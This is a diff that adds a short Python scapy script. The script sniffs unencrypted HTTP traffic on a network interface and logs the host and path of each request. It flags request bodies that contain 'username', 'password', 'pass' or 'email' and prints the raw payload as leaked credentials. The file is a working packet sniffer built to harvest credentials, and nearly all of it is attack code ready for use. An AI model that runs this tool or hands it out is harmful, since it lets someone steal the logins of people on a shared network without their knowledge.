@@ -1,0 +1,29 @@
+import scapy.all as scapy
+import argparse
+from scapy.layers import http
+
+def get_interface():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-i", "--interface", dest="interface", default="eth0", 
+                       help="Specify interface to sniff packets (default: eth0)")
+    return parser.parse_args().interface
+
+def sniff(iface):
+    scapy.sniff(iface=iface, store=False, prn=process_packet, filter="tcp port 80")
+
+def process_packet(packet):
+    if packet.haslayer(http.HTTPRequest):
+        host = packet[http.HTTPRequest].Host.decode('utf-8')
+        path = packet[http.HTTPRequest].Path.decode('utf-8') if packet[http.HTTPRequest].Path else ""
+        print(f"[+] HTTP Request >> {host}{path}")
+
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
+            keys = ["username", "password", "pass", "email"]
+            for key in keys:
+                if key in load:
+                    print(f"\n[!] Possible credentials leaked >> {load}\n")
+                    break
+
+iface = get_interface()
+sniff(iface)
